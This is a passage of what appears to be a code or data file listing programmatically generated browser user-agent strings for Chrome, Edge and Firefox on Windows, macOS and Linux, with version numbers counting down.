    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537 Edg/51",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:86) Gecko/20100101 Firefox/86",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537 Edg/49",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:85) Gecko/20100101 Firefox/85",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537 Edg/47",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:84) Gecko/20100101 Firefox/84",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537 Edg/45",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:83) Gecko/20100101 Firefox/83",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537 Edg/43",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:82) Gecko/20100101 Firefox/82",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537 Edg/41",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:81) Gecko/20100101 Firefox/81",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537 Edg/39",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:80) Gecko/20100101 Firefox/80",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537 Edg/37",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:79) Gecko/20100101 Firefox/79",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537 Edg/35",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:78) Gecko/20100101 Firefox/78",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537 Edg/33",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:77) Gecko/20100101 Firefox/77",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537 Edg/31",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:76) Gecko/20100101 Firefox/76",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537 Edg/29",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:75) Gecko/20100101 Firefox/75",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537 Edg/27",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:74) Gecko/20100101 Firefox/74",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537 Edg/25",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:73) Gecko/20100101 Firefox/73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537 Edg/23",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:72) Gecko/20100101 Firefox/72",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537 Edg/21",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:71) Gecko/20100101 Firefox/71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537 Edg/19",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:70) Gecko/20100101 Firefox/70",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537 Edg/17",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:69) Gecko/20100101 Firefox/69",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537 Edg/15",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:68) Gecko/20100101 Firefox/68",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537 Edg/13",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:67) Gecko/20100101 Firefox/67",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537 Edg/11",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:66) Gecko/20100101 Firefox/66",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537 Edg/9",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:65) Gecko/20100101 Firefox/65",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537 Edg/7",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:64) Gecko/20100101 Firefox/64",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537 Edg/5",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:63) Gecko/20100101 Firefox/63",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537 Edg/3",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:62) Gecko/20100101 Firefox/62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537 Edg/1",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:61) Gecko/20100101 Firefox/61",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:60) Gecko/20100101 Firefox/60",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:59) Gecko/20100101 Firefox/59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:58) Gecko/20100101 Firefox/58",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:57) Gecko/20100101 Firefox/57",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:56) Gecko/20100101 Firefox/56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:55) Gecko/20100101 Firefox/55",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:54) Gecko/20100101 Firefox/54",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:53) Gecko/20100101 Firefox/53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:52) Gecko/20100101 Firefox/52",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:51) Gecko/20100101 Firefox/51",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:50) Gecko/20100101 Firefox/50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:49) Gecko/20100101 Firefox/49",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:48) Gecko/20100101 Firefox/48",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:47) Gecko/20100101 Firefox/47",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:46) Gecko/20100101 Firefox/46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:45) Gecko/20100101 Firefox/45",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:44) Gecko/20100101 Firefox/44",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:43) Gecko/20100101 Firefox/43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:42) Gecko/20100101 Firefox/42",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:41) Gecko/20100101 Firefox/41",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:40) Gecko/20100101 Firefox/40",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:39) Gecko/20100101 Firefox/39",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:38) Gecko/20100101 Firefox/38",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:37) Gecko/20100101 Firefox/37",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:36) Gecko/20100101 Firefox/36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:35) Gecko/20100101 Firefox/35",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:34) Gecko/20100101 Firefox/34",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:33) Gecko/20100101 Firefox/33",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:32) Gecko/20100101 Firefox/32",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:31) Gecko/20100101 Firefox/31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:30) Gecko/20100101 Firefox/30",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:29) Gecko/20100101 Firefox/29",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:28) Gecko/20100101 Firefox/28",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:27) Gecko/20100101 Firefox/27",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:26) Gecko/20100101 Firefox/26",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:25) Gecko/20100101 Firefox/25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:24) Gecko/20100101 Firefox/24",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:23) Gecko/20100101 Firefox/23",
